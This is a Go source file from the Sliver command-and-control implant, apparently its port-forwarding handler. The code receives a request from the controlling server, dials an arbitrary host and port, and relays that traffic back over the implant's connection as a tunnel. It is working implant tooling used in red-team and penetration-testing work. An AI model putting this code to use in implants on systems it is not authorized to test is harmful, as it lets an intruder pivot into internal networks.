package tunnel_handlers

import (

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"context"
	"fmt"
	"io"
	"net"
	"time"

	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

func PortfwdReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
	portfwdReq := &sliverpb.PortfwdReq{}
	err := proto.Unmarshal(envelope.Data, portfwdReq)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[portfwd] Failed to unmarshal protobuf %s", err)
		// {{end}}
		portfwdResp, _ := proto.Marshal(&sliverpb.Portfwd{
			Response: &commonpb.Response{
				Err: err.Error(),
			},
		})
		reportError(envelope, connection, portfwdResp)
		return
	}

	var defaultDialer = new(net.Dialer)

	// TODO: Configurable context
	remoteAddress := fmt.Sprintf("%s:%d", portfwdReq.Host, portfwdReq.Port)
	// {{if .Config.Debug}}
	log.Printf("[portfwd] Dialing -> %s", remoteAddress)
	// {{end}}

	ctx, cancelContext := context.WithCancel(context.Background())

	dst, err := defaultDialer.DialContext(ctx, "tcp", remoteAddress)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[portfwd] Failed to dial remote address %s", err)
		// {{end}}
		cancelContext()
		portfwdResp, _ := proto.Marshal(&sliverpb.Portfwd{
			Response: &commonpb.Response{
				Err: err.Error(),
			},
		})
		reportError(envelope, connection, portfwdResp)
		return
	}
	if conn, ok := dst.(*net.TCPConn); ok {
		// {{if .Config.Debug}}
		log.Printf("[portfwd] Configuring keep alive")
		// {{end}}
		conn.SetKeepAlive(true)
		// TODO: Make KeepAlive configurable
		conn.SetKeepAlivePeriod(30 * time.Second)
	}

	// Add tunnel
	// {{if .Config.Debug}}
	log.Printf("[portfwd] Creating tcp tunnel")
	// {{end}}
	tunnel := transports.NewTunnel(
		portfwdReq.TunnelID,
		dst,
		dst,
	)
	connection.AddTunnel(tunnel)

	// Send portfwd response
	portfwdResp, _ := proto.Marshal(&sliverpb.Portfwd{
		Port:     portfwdReq.Port,
		Host:     portfwdReq.Host,
		Protocol: sliverpb.PortFwdProtoTCP,
		TunnelID: portfwdReq.TunnelID,
	})
	connection.Send <- &sliverpb.Envelope{
		ID:   envelope.ID,
		Data: portfwdResp,
	}

	cleanup := func(reason error) {
		// {{if .Config.Debug}}
		log.Printf("[portfwd] Closing tunnel %d (%s)", tunnel.ID, reason)
		// {{end}}
		tunnel := connection.Tunnel(tunnel.ID)

		tunnelClose, _ := proto.Marshal(&sliverpb.TunnelData{
			Closed:   true,
			TunnelID: tunnel.ID,
		})
		connection.Send <- &sliverpb.Envelope{
			Type: sliverpb.MsgTunnelClose,
			Data: tunnelClose,
		}
		connection.RemoveTunnel(tunnel.ID)
		dst.Close()
		cancelContext()
	}

	go func() {
		tWriter := tunnelWriter{
			tun:  tunnel,
			conn: connection,
		}
		n, err := io.Copy(tWriter, tunnel.Reader)
		_ = n // avoid not used compiler error if debug mode is disabled
		// {{if .Config.Debug}}
		log.Printf("[tunnel] Tunnel done, wrote %v bytes", n)
		// {{end}}

		cleanup(err)
	}()
}
